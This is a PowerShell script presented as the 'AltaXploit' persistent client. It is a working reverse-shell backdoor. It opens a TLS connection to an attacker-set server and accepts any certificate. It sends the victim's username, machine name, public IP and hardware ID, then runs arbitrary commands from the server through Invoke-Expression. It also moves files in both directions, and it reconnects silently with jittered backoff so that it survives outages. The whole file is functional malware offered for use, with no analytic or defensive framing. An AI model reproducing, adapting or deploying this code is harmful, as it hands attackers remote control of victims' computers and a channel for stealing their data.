# ============================================================
# AltaXploit Advanced Persistent PowerShell Client
# Features: Native output, Auto-reconnect, Read Timeout, Heartbeat
# ============================================================

$ErrorActionPreference = "SilentlyContinue"
$server = "YOUR IP"
$port = 443

# === Reconnection Settings ===
$script:reconnectDelay = 5
$script:maxReconnectDelay = 300
$script:reconnectAttempts = 0
$script:jitter = 0

# === Heartbeat Settings ===
$script:heartbeatInterval = 30  # seconds
$script:lastHeartbeat = (Get-Date)

# === Hex Functions ===
function HexStringToByteArray($hex) {
    if ($hex.Length -eq 0) { return @() }
    try {
        $bytes = New-Object byte[] ($hex.Length / 2)
        for ($i = 0; $i -lt $hex.Length; $i += 2) {
            $bytes[$i / 2] = [Convert]::ToByte($hex.Substring($i, 2), 16)
        }
        return $bytes
    } catch {
        return @()
    }
}

function ByteArrayToHexString($bytes) {
    if ($bytes.Count -eq 0) { return "" }
    try {
        return ($bytes | ForEach-Object { $_.ToString("X2") }) -join ""
    } catch {
        return ""
    }
}

# === System Info ===
function Get-SystemInfo {
    $os = (Get-CimInstance Win32_OperatingSystem).Caption
    $userMachine = "$env:USERNAME@$env:COMPUTERNAME"
    try {
        $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5)
    } catch {
        $ip = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1).IPAddress
    }
    $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
    @{ IP = $ip; OS = $os; UserMachine = $userMachine; HWID = $hwid } | ConvertTo-Json -Compress
}

# === Connect to Server with Keep-Alive and Read Timeout ===
function Connect-ToServer {
    $tcpClient = New-Object Net.Sockets.TcpClient
    # Enable TCP keep-alive
    $tcpClient.Client.SetSocketOption([Net.Sockets.SocketOptionLevel]::Socket, [Net.Sockets.SocketOptionName]::KeepAlive, $true)
    $tcpClient.Connect($server, $port)
    $sslStream = New-Object Net.Security.SslStream($tcpClient.GetStream(), $false, { $true })
    $sslStream.AuthenticateAsClient($server)
    # Set read timeout to 5 minutes (300 seconds) to avoid indefinite hang
    $sslStream.ReadTimeout = 300000  # milliseconds
    $writer = New-Object System.IO.StreamWriter($sslStream)
    $writer.AutoFlush = $true
    $reader = New-Object System.IO.StreamReader($sslStream)
    return @{ Client = $tcpClient; Writer = $writer; Reader = $reader; Stream = $sslStream }
}

# === Heartbeat Sender (runs in background) ===
function Start-Heartbeat {
    param($writer)
    while ($true) {
        Start-Sleep -Seconds $script:heartbeatInterval
        try {
            $writer.WriteLine("heartbeat")
            $script:lastHeartbeat = (Get-Date)
        } catch {
            # If heartbeat fails, break to trigger reconnect
            break
        }
    }
}

# === Native Command Executor ===
function Invoke-NativeCommand {
    param($Command)
    try {
        if (-not $Command -or $Command.Trim() -eq "") { return $null }
        $output = Invoke-Expression $Command 2>&1
        if ($output) { return $output | Out-String -Width 200 }
        return $null
    } catch {
        return "ERROR: $($_.Exception.Message)"
    }
}

# === Main Command Processor ===
function Process-Commands($writer, $reader, $stream) {
    $uploading = $false
    $uploadPath = ""
    $uploadBuffer = ""

    # Send system info
    $writer.WriteLine("INFO:$(Get-SystemInfo)")

    while ($true) {
        try {
            $line = $reader.ReadLine()
            if ($null -eq $line) { break }

            # Handle heartbeat from server (if any)
            if ($line -eq "heartbeat") {
                $writer.WriteLine("heartbeat")
                continue
            }

            # File upload handling
            if ($uploading) {
                if ($line -eq "__end__") {
                    try {
                        $bytes = HexStringToByteArray $uploadBuffer
                        [IO.File]::WriteAllBytes($uploadPath, $bytes)
                        $writer.WriteLine("__end__")
                    } catch {
                        $writer.WriteLine("ERROR: Upload failed - $($_.Exception.Message)")
                        $writer.WriteLine("__end__")
                    }
                    $uploading = $false
                    $uploadBuffer = ""
                    $uploadPath = ""
                } else {
                    $uploadBuffer += $line
                }
                continue
            }

            if ($line -match "^exit$") {
                $writer.WriteLine("__end__")
                break
            }
            if ($line -match "^__upload__:(.+)$") {
                $uploadPath = $matches[1]
                $uploadBuffer = ""
                $uploading = $true
                continue
            }
            if ($line -match "^download\s+(.+)$") {
                $filePath = $matches[1]
                if (-not (Test-Path $filePath)) {
                    $writer.WriteLine("ERROR: File not found")
                    $writer.WriteLine("__end__")
                    continue
                }
                try {
                    $bufferSize = 8192
                    $fs = [IO.File]::OpenRead($filePath)
                    $bytes = New-Object byte[] $bufferSize
                    while (($read = $fs.Read($bytes, 0, $bufferSize)) -gt 0) {
                        $chunk = ByteArrayToHexString ($bytes[0..($read-1)])
                        $writer.WriteLine($chunk)
                    }
                    $fs.Close()
                    $writer.WriteLine("__end__")
                } catch {
                    $writer.WriteLine("ERROR: Download failed - $($_.Exception.Message)")
                    $writer.WriteLine("__end__")
                }
                continue
            }

            # Normal command execution
            $result = Invoke-NativeCommand -Command $line
            if ($result) {
                ($result -split "`r?`n") | ForEach-Object {
                    if ($_.Trim()) {
                        if ($_.Length -gt 4000) {
                            for ($i = 0; $i -lt $_.Length; $i += 4000) {
                                $writer.WriteLine($_.Substring($i, [Math]::Min(4000, $_.Length - $i)))
                            }
                        } else {
                            $writer.WriteLine($_)
                        }
                    }
                }
            }
            $writer.WriteLine("__end__")

        } catch [System.IO.IOException] {
            # Read timeout or other IO error -> break to reconnect
            Write-Host "[!] Connection timeout or IO error. Reconnecting..." -ForegroundColor Yellow
            break
        } catch {
            try {
                $writer.WriteLine("ERROR: $($_.Exception.Message)")
                $writer.WriteLine("__end__")
            } catch {
                break
            }
        }
    }
}

# === PERSISTENT MAIN LOOP with Heartbeat ===
while ($true) {
    try {
        $connection = Connect-ToServer
        $script:reconnectAttempts = 0
        $script:reconnectDelay = 5

        # Start heartbeat sender in background
        $heartbeatJob = Start-Job -ScriptBlock {
            param($w)
            while ($true) {
                Start-Sleep -Seconds 30
                try { $w.WriteLine("heartbeat") } catch { break }
            }
        } -ArgumentList $connection.Writer

        Process-Commands $connection.Writer $connection.Reader $connection.Stream

        # Clean up
        $connection.Client.Close()
        Stop-Job $heartbeatJob -ErrorAction SilentlyContinue
        Remove-Job $heartbeatJob -ErrorAction SilentlyContinue

        Start-Sleep -Seconds 5

    } catch {
        # Connection failed - exponential backoff
        $script:reconnectAttempts++
        $baseDelay = [Math]::Min($script:reconnectDelay * $script:reconnectAttempts, $script:maxReconnectDelay)
        $script:jitter = Get-Random -Minimum 1 -Maximum 15
        $totalDelay = $baseDelay + $script:jitter
        Start-Sleep -Seconds $totalDelay
    }
}
